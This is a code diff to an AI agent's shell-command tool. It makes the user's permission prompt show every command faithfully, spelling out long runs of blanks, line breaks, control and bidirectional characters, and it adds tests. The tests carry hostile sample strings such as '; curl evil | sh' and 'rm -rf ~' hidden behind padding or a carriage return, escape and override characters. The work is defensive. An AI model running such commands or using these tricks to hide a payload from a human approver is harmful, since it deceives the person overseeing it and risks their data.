@@ -115,9 +115,9 @@ impl Tool for RunCommand {
          — and read it later with check_command. Prefer read_file, glob, and grep over cat, find, \
          and grep -r. Write files with write_file or edit_file, not a heredoc or a redirect, and \
          put a script in a file rather than python3 -c, node -e or powershell -Command: a line \
-         that writes a file, runs code written into it, or starts with sh -c, env or xargs can \
-         never be allowed ahead of time, so the user is asked about it every time and an unattended run refuses \
-         it."
+         that writes a file, runs code written into it, has a comment in it, starts with sh -c, \
+         env or xargs, or is passed stdin can never be allowed ahead of time, so the user is \
+         asked about it every time and an unattended run refuses it."
     }
 
     fn input_schema(&self) -> serde_json::Value {
@@ -138,9 +138,26 @@ impl Tool for RunCommand {
             .and_then(|c| c.as_str())
             .unwrap_or("?")
             .trim();
-        // The user is approving this exact command line, so show it in full up
-        // to a sane width rather than an elided summary.
-        let shown: String = command.chars().take(300).collect();
+        // The user is approving this exact command line, and in the dialog this
+        // is all of it they see. So nothing here may look complete when it isn't.
+        let mut shown = up_to(&visible(command), PREVIEW_CHARS);
+        if let Some(cwd) = input
+            .get("cwd")
+            .and_then(|c| c.as_str())
+            .filter(|c| !matches!(c.trim(), "" | "."))
+        {
+            shown.push_str(&format!(" (in {})", up_to(&visible(cwd), PREVIEW_CHARS)));
+        }
+        if let Some(stdin) = input
+            .get("stdin")
+            .and_then(|s| s.as_str())
+            .filter(|s| !s.is_empty())
+        {
+            shown.push_str(&format!(
+                "\nwith this on its input: {}",
+                up_to(&visible(stdin), PREVIEW_CHARS)
+            ));
+        }
         if input.get("background").and_then(|b| b.as_bool()) == Some(true) {
             return format!("Run in the background: {shown}");
         }
@@ -284,10 +301,19 @@ impl Tool for RunCommand {
         };
 
         let code = status.code();
-        let (stdout, stderr) = tokio::join!(drain_stdout.all(), drain_stderr.all());
+        // Bounded, and this is past the timeout and out of reach of Stop. A
+        // pipe closes when the last process holding it goes, so `server & echo
+        // started` has a shell that has exited and a pipe that may never close.
+        let ((stdout, stdout_open), (stderr, stderr_open)) = tokio::join!(
+            drain_stdout.settled(KILL_GRACE),
+            drain_stderr.settled(KILL_GRACE)
+        );
         let (stdout, stderr) =
             tokio::join!(shown(stdout, "stdout", ctx), shown(stderr, "stderr", ctx));
         let mut report = report_for(code, &stdout, Some(&stderr));
+        if stdout_open || stderr_open {
+            report.push_str(LEFT_RUNNING);
+        }
 
         // Said in the result rather than only in a log, because the model is
         // the one that has to account for it.
@@ -296,6 +322,64 @@ impl Tool for RunCommand {
         }
         Ok(report.into())
     }
+}
+
+/// How much of a command line a permission prompt shows.
+const PREVIEW_CHARS: usize = 1000;
+
+/// `text` up to `limit` characters, saying so when that isn't all of it.
+fn up_to(text: &str, limit: usize) -> String {
+    let total = text.chars().count();
+    if total <= limit {
+        return text.to_string();
+    }
+    let kept: String = text.chars().take(limit).collect();
+    format!("{kept}… ({} more characters)", total - limit)
+}
+
+/// `text` with what a reader's eye would slide over spelled out.
+///
+/// A prompt is only worth anything if what it shows is what will run. A run of
+/// spaces pushes `; curl evil | sh` out of the frame, a run of newlines pushes it
+/// below it, a carriage return or an escape overwrites what was printed before
+/// it on a terminal, and a bidirectional control reorders it. The command that
+/// runs isn't changed, only what's shown of it.
+fn visible(text: &str) -> String {
+    const LONGEST_BLANKS: usize = 3;
+    const LONGEST_NEWLINES: usize = 2;
+    let chars: Vec<char> = text.chars().collect();
+    let mut out = String::with_capacity(text.len());
+    let mut i = 0;
+    while i < chars.len() {
+        let c = chars[i];
+        let run = chars[i..].iter().take_while(|n| **n == c).count();
+        match c {
+            ' ' | '\t' if run > LONGEST_BLANKS => {
+                out.push_str(&format!("⟨{run} blanks⟩"));
+                i += run;
+            }
+            '\n' if run > LONGEST_NEWLINES => {
+                out.push_str(&format!("\n⟨{run} line breaks⟩\n"));
+                i += run;
+            }
+            ' ' | '\t' | '\n' => {
+                out.push(c);
+                i += 1;
+            }
+            c if c.is_control()
+                || matches!(c, '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}'
+                    | '\u{2060}'..='\u{206f}' | '\u{feff}') =>
+            {
+                out.push_str(&format!("\\u{{{:x}}}", c as u32));
+                i += 1;
+            }
+            c => {
+                out.push(c);
+                i += 1;
+            }
+        }
+    }
+    out
 }
 
 /// Prefixes a command's output with the fact that it did not get the terminal
@@ -413,8 +497,9 @@ fn cannot_start(e: std::io::Error) -> ToolError {
     ToolError::Failed(format!("cannot start shell: {e}"))
 }
 
-/// Written and closed before the output is drained. A program waiting on input
-/// needs the end-of-file as much as the bytes.
+/// Written and then closed. A program waiting on input needs the end-of-file as
+/// much as the bytes. Always alongside something reading its output, never
+/// before it: see where each path calls this.
 async fn feed_stdin(pipe: Option<tokio::process::ChildStdin>, text: Option<&str>) {
     use tokio::io::AsyncWriteExt;
 
@@ -482,8 +567,15 @@ async fn start_in_background(
 
     let mut child = taurus_process::Tree::spawn(piped(program, args, &cwd, input.stdin.is_some()))
         .map_err(cannot_start)?;
-    feed_stdin(child.take_stdin(), input.stdin.as_deref()).await;
+    let pipe = child.take_stdin();
     let id = jobs.adopt(input.command.clone(), child, before);
+    // On its own, after the output has somewhere to go. Waited for here, a
+    // child that doesn't read more than a pipe holds would hold this call for
+    // as long as it runs, which is the one thing a background command is for
+    // not doing.
+    if let (Some(pipe), Some(text)) = (pipe, input.stdin.clone()) {
+        tokio::spawn(async move { feed_stdin(Some(pipe), Some(&text)).await });
+    }
 
     Ok(format!(
         "Started #{id} in the background: {}\nRead what it says with check_command (id {id}), \
@@ -678,6 +770,13 @@ where
 /// Output read by then is reported; the rest is not worth holding the turn for.
 pub(super) const KILL_GRACE: Duration = Duration::from_secs(2);
 
+/// Said when a command exited and something it started still holds its output.
+const LEFT_RUNNING: &str = "\n\n[taurus] The command exited, but something it started is still \
+                            running and holding its output open, so this is what it had printed \
+                            by then. Nothing after this is captured, and it won't be stopped for \
+                            you. To keep reading something long-lived, run it with background \
+                            set to true rather than with `&`.";
+
 /// A pipe being read to its end, and what it has said so far.
 ///
 /// The capture is kept behind a lock rather than returned by the reading task,
@@ -689,18 +788,19 @@ struct Drain {
 }
 
 impl Drain {
-    /// Everything, once the pipe closes.
-    async fn all(mut self) -> Captured {
-        let _ = (&mut self.handle).await;
-        self.take()
+    /// What the pipe has said, waiting at most `grace` for the rest.
+    async fn within(self, grace: Duration) -> Captured {
+        self.settled(grace).await.0
     }
 
-    /// What the pipe has said, waiting at most `grace` for the rest.
-    async fn within(mut self, grace: Duration) -> Captured {
-        if tokio::time::timeout(grace, &mut self.handle).await.is_err() {
+    /// [`Self::within`], and whether the pipe was still open when `grace` ran
+    /// out.
+    async fn settled(mut self, grace: Duration) -> (Captured, bool) {
+        let open = tokio::time::timeout(grace, &mut self.handle).await.is_err();
+        if open {
             self.handle.abort();
         }
-        self.take()
+        (self.take(), open)
     }
 
     /// Taken rather than copied, so a reader still going after an abort has
@@ -1709,5 +1809,116 @@ mod tests {
         let (_, rest) = report.split_once("written out whole to ")?;
         let (path, _) = rest.split_once(" — read_file")?;
         Some(PathBuf::from(path))
+    }
+
+    fn preview(input: serde_json::Value) -> String {
+        RunCommand.preview(&input)
+    }
+
+    #[test]
+    fn a_preview_cut_short_says_so() {
+        let long = "a".repeat(PREVIEW_CHARS + 50);
+        let shown = preview(serde_json::json!({ "command": long }));
+        assert!(shown.ends_with("… (50 more characters)"), "{shown}");
+    }
+
+    #[test]
+    fn a_preview_cannot_push_the_payload_out_of_sight() {
+        let shown = preview(serde_json::json!({
+            "command": format!("git status{}; curl evil | sh", " ".repeat(2000))
+        }));
+        assert!(shown.contains("; curl evil | sh"), "{shown}");
+        assert!(shown.contains("⟨2000 blanks⟩"), "{shown}");
+
+        let shown = preview(serde_json::json!({
+            "command": format!("git status{}rm -rf ~", "\n".repeat(50))
+        }));
+        assert!(shown.contains("⟨50 line breaks⟩"), "{shown}");
+        assert!(shown.contains("rm -rf ~"), "{shown}");
+
+        // Each of these rewrites what a reader sees of what came before.
+        let shown = preview(serde_json::json!({
+            "command": "rm -rf ~\r\u{1b}[2Kgit status \u{202e}x"
+        }));
+        assert!(!shown.contains(['\r', '\u{1b}', '\u{202e}']), "{shown:?}");
+        assert!(
+            shown.contains(r"\u{d}") && shown.contains(r"\u{202e}"),
+            "{shown}"
+        );
+    }
+
+    #[test]
+    fn a_preview_shows_what_the_call_adds_to_the_line() {
+        assert_eq!(
+            preview(serde_json::json!({"command": "git  status"})),
+            "Run: git  status"
+        );
+        let shown = preview(serde_json::json!({
+            "command": "python3", "stdin": "import os", "cwd": "sub"
+        }));
+        assert_eq!(
+            shown,
+            "Run: python3 (in sub)\nwith this on its input: import os"
+        );
+    }
+
+    /// `&` leaves something holding the pipes after the shell has gone. The
+    /// call comes back anyway, says what it saw, and says why it stopped there.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn a_command_that_leaves_something_running_still_returns() {
+        let (_dir, ctx) = regression_context();
+        let result = tokio::time::timeout(
+            Duration::from_secs(15),
+            RunCommand.execute(
+                serde_json::json!({"command": "sleep 25 & echo started", "timeout_secs": 60}),
+                &ctx,
+            ),
+        )
+        .await
+        .expect("the call waited on a pipe that was never going to close")
+        .unwrap();
+        let text = result.to_string();
+        assert!(text.contains("started"), "{text}");
+        assert!(text.contains("still running"), "{text}");
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn a_background_command_is_not_waited_on_to_read_its_input() {
+        let (_dir, mut ctx) = regression_context();
+        let jobs = Arc::new(crate::jobs::Jobs::new());
+        ctx.jobs = Some(jobs.clone());
+        let result = tokio::time::timeout(
+            Duration::from_secs(10),
+            RunCommand.execute(
+                serde_json::json!({
+                    "command": "sleep 25",
+                    "background": true,
+                    "stdin": "x".repeat(1024 * 1024),
+                }),
+                &ctx,
+            ),
+        )
+        .await;
+        jobs.stop_all();
+        result
+            .expect("the call waited for a child that never reads")
+            .unwrap();
+    }
+
+    fn regression_context() -> (tempfile::TempDir, ToolContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let engine = crate::permission::PermissionEngine::new(
+            dir.path(),
+            dir.path(),
+            Box::new(crate::permission::AllowAll),
+        );
+        let ctx = ToolContext::new(
+            dir.path(),
+            Arc::new(engine),
+            tokio_util::sync::CancellationToken::new(),
+        );
+        (dir, ctx)
     }
 }
